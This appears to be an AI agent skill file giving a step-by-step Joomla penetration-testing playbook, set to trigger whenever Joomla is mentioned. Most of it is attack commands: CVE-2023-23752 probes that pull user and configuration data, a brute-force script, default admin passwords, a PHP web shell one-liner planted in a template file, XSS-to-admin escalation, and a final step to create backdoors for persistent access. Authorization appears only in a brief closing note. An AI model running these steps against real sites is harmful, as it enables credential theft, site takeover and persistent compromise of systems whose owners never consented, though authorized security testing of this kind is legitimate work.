---
name: joomla-pentest
description: Pentest Joomla CMS installations. Use this skill whenever the user mentions Joomla, wants to enumerate a Joomla site, check for Joomla vulnerabilities, perform brute-force attacks on Joomla, exploit Joomla RCE vulnerabilities, or assess Joomla security. Trigger for any Joomla-related security testing, vulnerability assessment, or penetration testing tasks.
---

# Joomla Pentesting Skill

A comprehensive guide for security testing Joomla CMS installations.

## When to Use This Skill

Use this skill when:
- You need to enumerate a Joomla website
- You want to check for known Joomla vulnerabilities
- You're performing a security assessment on a Joomla installation
- You need to test for brute-force vulnerabilities on Joomla admin panels
- You want to exploit known Joomla RCE vulnerabilities
- You're converting XSS to RCE on Joomla sites

## Enumeration

### Discovery and Footprinting

Start by identifying if the target is running Joomla:

1. **Check meta tags** for Joomla generator information:
   ```bash
   curl https://<target>/ | grep -i joomla | grep -i generator
   ```
   Look for: `<meta name="generator" content="Joomla! - Open Source Content Management" />`

2. **Check robots.txt** for Joomla-specific paths:
   ```bash
   curl https://<target>/robots.txt
   ```
   Joomla installations often have specific disallow patterns.

3. **Check README.txt** for version information:
   ```bash
   curl https://<target>/README.txt
   ```

### Version Detection

Identify the Joomla version to determine applicable vulnerabilities:

1. **Check joomla.xml** (if accessible):
   ```bash
   curl https://<target>/administrator/manifests/files/joomla.xml
   ```

2. **Check language files**:
   ```bash
   curl https://<target>/language/en-GB/en-GB.xml
   ```

3. **Check cache plugin**:
   ```bash
   curl https://<target>/plugins/system/cache/cache.xml
   ```

4. **Use automated scanners**:
   ```bash
   droopescan scan joomla --url https://<target>/
   ```

### API Information Disclosure (CVE-2023-23752)

Joomla versions 4.0.0 to 4.2.7 are vulnerable to unauthenticated information disclosure:

**Check for vulnerable endpoints:**

1. **Users endpoint**:
   ```bash
   curl https://<target>/api/v1/users?public=true
   ```

2. **Config file endpoint**:
   ```bash
   curl https://<target>/api/index.php/v1/config/application?public=true
   ```

**Using Metasploit:**
```bash
msfconsole -q
use scanner/http/joomla_api_improper_access_checks
set RHOSTS <target>
run
```

## Authentication Testing

### Brute-Force Attacks

Test for weak credentials on the Joomla admin panel:

**Using joomla-bruteforce script:**
```bash
python3 joomla-brute.py -u https://<target>/ -w /path/to/wordlist.txt -usr admin
```

**Common default credentials to try:**
- admin:admin
- administrator:administrator
- admin:password
- admin:joomla

## Remote Code Execution (RCE)

### Via Admin Panel Access

If you have admin credentials, you can achieve RCE through template customization:

1. **Navigate to Templates** in the admin panel (Configuration → Templates)
2. **Select a template** (e.g., protostar)
3. **Edit a template file** (e.g., error.php)
4. **Add PHP one-liner**:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
5. **Save and test**:
   ```bash
   curl https://<target>/templates/protostar/error.php?cmd=id
   ```

### Via JoomSploit (XSS to RCE)

JoomSploit is a comprehensive exploitation framework for Joomla:

**Capabilities:**
- Privilege escalation (create admin users)
- RCE via built-in template editing
- Custom exploits for third-party plugins
- Support for Joomla 3.x, 4.x, and 5.x

**Usage:**
```bash
python3 joomsploit.py --help
```

**Common attacks:**
- Create admin user from XSS
- Edit templates for RCE
- Exploit known plugin vulnerabilities

## Vulnerability Reference

### Known CVEs to Check

| CVE | Version Range | Impact |
|-----|---------------|--------|
| CVE-2023-23752 | 4.0.0 - 4.2.7 | Unauthenticated info disclosure |

### Version Statistics

Current Joomla version distribution (useful for targeting):
- 3.9: 27.24%
- 3.6: 22.85%
- 3.8: 17.72%
- 3.5: 12.24%
- 3.7: 7.99%
- 3.10: 6.33%
- 4.0: 3.21%

## Workflow Recommendations

1. **Start with enumeration** - Identify Joomla and version
2. **Check for known vulnerabilities** - Use automated scanners
3. **Test API endpoints** - Check for CVE-2023-23752
4. **Attempt authentication** - Try default credentials and brute-force
5. **Exploit RCE** - Use admin access or XSS to gain code execution
6. **Maintain access** - Create backdoors or persistent access

## Tools

- **droopescan** - Joomla vulnerability scanner
- **JoomSploit** - Joomla exploitation framework
- **Metasploit** - `scanner/http/joomla_api_improper_access_checks`
- **joomla-bruteforce** - Brute-force script

## Safety Notes

- Always obtain proper authorization before testing
- Document all findings for the client
- Test in controlled environments when possible
- Be aware of potential service disruption during testing
